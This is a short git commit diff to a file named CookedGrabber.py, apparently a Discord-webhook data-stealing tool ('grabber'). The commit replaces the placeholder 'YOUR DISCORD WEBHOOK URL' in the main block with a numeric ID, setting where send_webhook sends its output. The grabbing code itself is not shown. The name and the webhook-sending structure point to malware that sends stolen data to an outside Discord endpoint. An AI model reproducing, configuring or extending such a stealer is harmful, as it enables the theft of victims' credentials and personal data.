34cd790ad0e4161d3807a74fad17af015b958f30
Enc-zxc <ectacore7@gmail.com>
2024-10-24 20:17:33 +0700

    Update CookedGrabber.py

--- CookedGrabber.py
+++ CookedGrabber.py
@@ -517,7 +517,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
 if __name__ == "__main__":
     freeze_support()
     if len(sys.argv) == 1:
-        send_webhook(["YOUR DISCORD WEBHOOK URL"])
+        send_webhook(["1098683859513655309"])
     else:
         del sys.argv[0]
         send_webhook(sys.argv)
